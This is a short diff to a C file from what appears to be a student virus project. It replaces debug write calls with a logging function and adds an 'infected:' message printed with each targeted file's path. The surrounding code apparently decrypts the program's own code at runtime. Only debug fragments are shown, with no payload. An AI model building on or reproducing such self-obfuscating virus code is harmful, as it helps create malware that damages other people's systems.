@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 18:18:46 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/09 14:53:09 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,7 @@ void	inspect(t_data *data, char *path)
 #ifdef DEBUG
 	char de[] = "inspect\t0\n";
 	data->context == true ?	de[8] = 49 : 0;
-	_write(1, de, _strlen(de));
+	_log(de, _strlen(de));
 #endif
 
 	revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
@@ -57,8 +57,10 @@ void	inspect(t_data *data, char *path)
 	data->name = path;
 
 #ifdef DEBUG
-	_write(1, path, _strlen(path));
-	_write(1, &de[9], 1);
+	char de2[] = "infected:\t";
+	_log(de2, _strlen(de2));
+	_log(path, _strlen(path));
+	_log(&de[9], 1);
 #endif
 
 
